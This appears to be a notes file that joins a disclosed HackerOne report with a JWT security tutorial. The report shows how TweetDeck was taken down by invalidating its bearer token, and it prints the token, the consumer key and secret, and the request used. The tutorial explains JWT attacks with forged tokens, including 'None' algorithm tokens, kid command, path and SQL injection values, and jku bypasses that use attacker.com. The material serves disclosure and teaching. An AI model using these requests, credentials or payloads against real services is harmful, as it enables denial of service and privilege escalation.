
##
#
https://hackerone.com/reports/210779
#
##

[Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable

    Share:

Timeline
filedescriptor
submitted a report to Twitter.
Mar 4th (6 years ago)
First of all, really sorry for the unintentional DoS :( I was testing it with a fresh bearer token but copied the production one accidentally.
Details
I've noticed that TweetDeck is using OAuth2 to issue requests (Authorization Bearer token):
Code 727 BytesWrap lines Copy Download
GET https://api.twitter.com/1.1/help/settings.json?settings_version= HTTP/1.1
Host: api.twitter.com
Connection: keep-alive
Authorization: Bearer AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM
Origin: https://tweetdeck.twitter.com
X-Csrf-Token: 2170b7f455955368495bc191ed67c892
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/plain, */*; q=0.01
X-Twitter-Auth-Type: OAuth2Session
X-Twitter-Client-Version: Twitter-TweetDeck-blackbird-chrome/4.0.170302174617 web/
Referer: https://tweetdeck.twitter.com/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
According to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token
Now, it can be guessed that the hardcoded bearer token used in TweetDeck belongs to the TweetDeck client. The consumer key and consumer secret can be extracted from the desktop application:
Code 99 BytesWrap lines Copy Download
Consumer key:    yT577ApRtZw51q4NPMPPOQ
Consumer secret: 3neq3XqN5fO3obqwZoajavGFCUrC42ZfbrLXy5sCv8
Apparently, anyone can invalidate the bearer token while issuing token invalidation request:
Code 402 BytesWrap lines Copy Download
POST https://api.twitter.com/oauth2/invalidate_token HTTP/1.1
Authorization: Basic eVQ1NzdBcFJ0Wnc1MXE0TlBNUFBPUTozbmVxM1hxTjVmTzNvYnF3Wm9hamF2R0ZDVXJDNDJaZmJyTFh5NXNDdjg=
Host: api.twitter.com
Content-Length: 125
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

access_token=AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM
And suddenly all the requests on TweetDeck result in {"errors":[{"code":89,"message":"Invalid or expired token."}]}.
andrewsorensen
 changed the status to Triaged. 
Mar 4th (6 years ago)
Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.
Thank you for helping keep Twitter secure!
filedescriptor
 posted a comment. 
Updated Mar 4th (6 years ago)
I suspect other services could potential have the same issues. For example mobile.twitter.com is also using the same way to establish API connections. Fix-wise I wonder if forbidding bearer token invalidation on official clients is enough.
andrewsorensen
 posted a comment. 
Mar 4th (6 years ago)
Hi filedescriptor,
Thanks for the information. While we investigate this issue and fix the bearer token for tweetdeck.twitter.com please don't try to revoke any other OAuth bearer tokens until this report has been closed out. We'll take the full impact of this issue into consideration when we award a bounty.
Thanks for thinking of Twitter security!
filedescriptor
 posted a comment. 
Updated Mar 4th (6 years ago)
I stopped all my testings immediately after I realized the consequence so yeah I won't.
andrewsorensen
 posted a comment. 
Mar 4th (6 years ago)
Thanks. We've restored TweetDeck but are still looking into the issue of being able to invalidate the bearer token.
filedescriptor
 posted a comment. 
Updated Mar 6th (6 years ago)
I also noticed mobile Twitter clients depend on a similar way (for the xAuth part) but they generate a new bearer token every time.
According to the documentation: https://dev.twitter.com/oauth/reference/post/oauth2/token

    Only one bearer token may exist outstanding for an application, and repeated requests to this method will yield the same already-existent token until it has been invalidated.

So technically they are always the same until being invalidated (and that explains why I accidentally DoS'd TweetDeck despite using a fresh token which was actually the same as the production one)
Moving on:

    [..] If attempted too frequently, requests will be rejected with a HTTP 403 with code 99

So an attacker could in theory keep creating and invalidating the bearer token for the mobile Twitter clients and achieve DoS there.
PS. Of course I didn't try it.
Twitter  rewarded filedescriptor with a $5,040 bounty. 
Mar 17th (6 years ago)
Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.
andrewsorensen
 closed the report and changed the status to Resolved. 
Jun 28th (5 years ago)
We consider this issue to be fixed now. Can you please confirm?
Thank you for helping keep Twitter secure!
filedescriptor
 posted a comment. 
Updated Jun 28th (5 years ago)
I'm not sure how to retest it as it might make certain services unavailable again. How do you think I should proceed?
filedescriptor
 posted a comment. 
Jul 4th (5 years ago)
Pinging again
andrewsorensen
 posted a comment. 
Jul 5th (5 years ago)
Understood. We believe this issue is fixed so testing should not have any impact. However, testing with a test application (where possible) instead of a production application would be preferred.
filedescriptor
 posted a comment. 
Updated Jul 5th (5 years ago)
I believe the consumer secret for TweetDeck has been rotated, and other official clients have rejected invalidation requests: {"errors":[{"code":348,"message":"Client application is not permitted to to invalidate this token."}]}. I think it's fixed.
filedescriptor
 requested to disclose this report. 
Jul 5th (5 years ago)
swilson
Twitter staff  posted a comment. 
Jul 7th (5 years ago)
@filedescriptor would like to request we hold off publishing for now. As a part of the clean up after the issue was discovered, we found the scope is larger than just TD. I want to wait and get the remaining updated and then give the all clear to publish if thats ok?
swilson
Twitter staff  reopened this report. 
Jul 7th (5 years ago)
Reopening report as scope is more than just TD. Also re-opened JIRA ticket.
filedescriptor
 posted a comment. 
Jul 7th (5 years ago)
No problem at all
andrewsorensen
 closed the report and changed the status to Resolved. 
Apr 5th (4 years ago)
We consider this issue to be fixed now. Our documentation now clearly calls out the repercussions of having OAuth credentials that are public and how that allows requests to be made on behalf of the application.
Thank you for helping keep Twitter secure!
acamacho
Twitter staff  posted a comment. 
Apr 8th (4 years ago)
@filedescriptor just wanted to checkin with you about the disclosure, did you want to proceed or cancel out the disclosure request? 
filedescriptor
 requested to disclose this report. 
Apr 16th (4 years ago)
Let's disclose it!
acamacho
Twitter staff  agreed to disclose this report. 
Apr 25th (4 years ago)
 This report has been disclosed. 

#
##
##
#


The JWT format

A JSON Web Token consists of a header, payload, and signature in base64url encoding, separated by dots, as follows:

HEADER.PAYLOAD.SIGNATURE

Let’s take apart the following real token:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJuYW1lIjoiSm9obiBEb2UiLCJ1c2VyX25hbWUiOiJqb2huLmRvZSIsImlzX2FkbWluIjpmYWxzZX0.
fSppjHFaqlNcpK1Q8VudRD84YIuhqFfA67XkLam0_aY

The header contains metadata about the token, such as the algorithm used for the signature and the type of the token (which is simply JWT). For this example, the header before encoding is:

{
  "alg": "HS256",
  "typ": "JWT"
}

The payload contains information (claims) about the entity (user) that is going to be verified by the application. Our sample token includes the following claims:

{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}

Finally, to generate the signature, we have to apply base64url encoding to the header, dot, and payload, and then sign the whole thing using a secret (for symmetric encryption) or a private key (for asymmetric encryption), depending on the algorithm specified in the header. We’ve put HS256 in the header, which is a symmetric algorithm, so the encoding and signing operation would be:

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)

This gives us the following signature, which is then appended (after a dot) to the base64url-encoded header and payload:

fSppjHFaqlNcpK1Q8VudRD84YIuhqFfA67XkLam0_aY

Common JWT vulnerabilities

JSON Web Tokens were designed to be flexible and future-proof, leaving a lot of room for adaptation to a variety of use cases and requirements – but also a lot of room for mistakes in implementation and use. Here are some typical vulnerabilities that can be introduced when working with JWTs.
Failing to verify the signature

Many JWT libraries provide one method to decode the token and another to verify it:

    decode(): Only decodes the token from base64url encoding without verifying the signature.
    verify(): Decodes the token and verifies the signature.

Sometimes developers might mix up these methods. In that case, the signature is never verified and the application will accept any token (in a valid format). Developers might also disable signature verification for testing and then forget to re-enable it. Such mistakes could lead to arbitrary account access or privilege escalation.

For example, let’s say we have the following valid token that is never actually verified:

{
  "alg": "HS256",
  "typ": "JWT"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}

An attacker could send the following token with an arbitrary signature to obtain escalated privileges:

{
  "alg": "HS256",
  "typ": "JWT"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": true
}

Allowing the None algorithm

The JWT standard accepts many different types of algorithms to generate a signature:

    RSA
    HMAC
    Elliptic Curve 
    None

The None algorithm specifies that the token is not signed. If this algorithm is permitted, we can bypass signature checking by changing an existing algorithm to None and stripping the signature. Let’s start with our expected token:

{
  "alg": "HS256",
  "typ": "JWT" 
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}.SIGNATURE

Encoded and signed, the token will look like this (signature in bold):

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJuYW1lIjoiSm9obiBEb2UiLCJ1c2VyX25hbWUiOiJqb2huLmRvZSIsImlzX2FkbWluIjpmYWxzZX0.
fSppjHFaqlNcpK1Q8VudRD84YIuhqFfA67XkLam0_aY

If None is permitted as the algorithm value, an attacker can simply use it to replace the valid algorithm and then get rid of the signature:

{
  "alg": "None",
  "typ": "JWT"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": true
}.

Though now unsigned, the modified token will be accepted by the application:

eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.
eyJuYW1lIjoiSm9obiBEb2UiLCJ1c2VyX25hbWUiOiJqb2huLmRvZSIsImlzX2FkbWluIjp0cnVlfQ.

That is why it is important to not accept tokens with None, none, NONE, nOnE, or any other case variations in the alg header.
Algorithm confusion

JWT accepts both symmetric and asymmetric encryption algorithms. Depending on the encryption type, you need to use either a shared secret or a public-private key pair:

Algorithm
	

Key used to sign
	

Key used to verify

Asymmetric (RSA)
	

Private key
	

Public key

Symmetric (HMAC)
	

Shared secret
	

Shared secret

When an application uses asymmetric encryption, it can openly publish its public key and keep the private key secret. This allows the application to sign tokens using its private key and anyone can verify this token using its public key. The algorithm confusion vulnerability arises when an application does not check whether the algorithm of the received token matches the expected algorithm.

In many JWT libraries, the method to verify the signature is:

    verify(token, secret) – if the token is signed with HMAC
    verify(token, publicKey) – if the token is signed with RSA or similar

Unfortunately, in some libraries, this method by itself does not check whether the received token is signed using the application’s expected algorithm. That’s why in the case of HMAC this method will treat the second argument as a shared secret and in the case of RSA as a public key.

If the public key is accessible within the application, an attacker can forge malicious tokens by:

    Changing the algorithm of the token to HMAC
    Tampering with the payload to get the desired outcome
    Signing the malicious token with the public key found in the application
    Sending the JWT back to the application

The application expects RSA encryption, so when an attacker supplies HMAC instead, the verify() method will treat the public key as an HMAC shared secret and use symmetric rather than asymmetric encryption. This means that the token will be signed using the application’s non-secret public key and then verified using the same public key.

To avoid this vulnerability, applications must check if the algorithm of the received token is the expected one before they pass the token to the verify() method.
Using trivial secrets

With symmetric encryption, a cryptographic signature is only as strong as the secret used. If an application uses a weak secret, the attacker can simply brute-force it by trying different secret values until the original signature matches the forged one. Having discovered the secret, the attacker can use it to generate valid signatures for malicious tokens. To avoid this vulnerability, strong secrets must always be used with symmetric encryption.
Attacks against JSON Web Tokens
kid parameter injections

The JWT header can contain the Key Id parameter kid. It is often used to retrieve the key from a database or filesystem. The application verifies the signature using the key obtained through the kid parameter. If the parameter is injectable, it can open the way to signature bypass or even attacks such as RCE, SQLi, and LFI.

To see this in action, let’s start with the following valid token:

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}

If the kid parameter is vulnerable to command injection, the following modification might lead to remote code execution:

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1|/usr/bin/uname"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}

kid parameter injection + directory traversal = signature bypass

If an application uses the kid parameter to retrieve the key from the filesystem, it might be vulnerable to directory traversal. Then an attacker can force the application to use a file whose value the attacker can predict as a key for verification. This can be done using any static file within the application. Knowing the key file value, the attacker can craft a malicious token and sign it using the known key.

Continuing with the previous JWT example, an attacker might try to insert /dev/null as the key source to force the application to use an empty key:

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": true
}

If directory traversal to /dev/null succeeds, the attacker will be able to sign a malicious token using an empty string. The same technique can be used with known static files, for example CSS files.
kid parameter injection + SQL injection = signature bypass

If an application uses the kid parameter to retrieve the key from a database, it might be vulnerable to SQL injection. If successful, an attacker can control the value returned to the kid parameter from an SQL query and use it to sign a malicious token.

Again using the same example token, let’s say the application uses the following vulnerable SQL query to get its JWT key via the kid parameter:

SELECT key FROM keys WHERE key='key1'

An attacker can then inject a UNION SELECT statement into the kid parameter to control the key value:

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "xxxx' UNION SELECT 'aaa"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": true
}

If SQL injection succeeds, the application will use the following query to retrieve the signature key:

SELECT key FROM keys WHERE key='xxxx' UNION SELECT 'aaa'

This query returns aaa into the kid parameter, allowing the attacker to sign a malicious token simply with aaa. 

To avoid these and other injection attacks, applications should always sanitize the value of the kid parameter before using it.
Attacks using the jku header

In the JWT header, developers can also use the jku parameter to specify the JSON Web Key Set URL. This parameter indicates where the application can find the JSON Web Key (JWK) used to verify the signature – basically the public key in JSON format.

To illustrate, let’s take the following JWT that uses the jku parameter to specify the public key:

{
  "alg": "RS256",
  "typ": "JWT",
  "jku":"https://example.com/key.json"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}

The specified key.json file might look something like:

{
  "kty": "RSA",
  "n": "-4KIwb83vQMH0YrzE44HppWvyNYmyuznuZPKWFt3e0xmdi-WcgiQZ1TC...RMxYC9lr4ZDp-M0",
  "e": "AQAB"
}

The application verifies the signature using the JSON Web Key retrieved based on the jku header value:
JSON Web Token verification using a legitimate JKU

Now for the attack. An attacker can change the jku parameter value to point to their own JWK instead of the valid one. If accepted, this allows the attacker to sign malicious tokens using their own private key. After the malicious token is sent, the application will fetch the attacker’s JWK and use it to verify the signature:
JSON Web Token verification using a malicious JKU

To prevent such attacks, applications typically use URL filtering. Unfortunately, there are ways for attackers to bypass such filtering, including:

    Using https://trusted (for example https://trusted@attacker.com/key.json), if the application checks for URLs starting with trusted
    Using URL fragments with the # character
    Using the DNS naming hierarchy
    Chaining with an open redirect
    Chaining with a header Injection
    Chaining with SSRF

For this reason, it is very important for the application to whitelist permitted hosts and have correct URL filtering in place. Beyond that, the application must not have other vulnerabilities that an attacker might chain to bypass URL filtering.

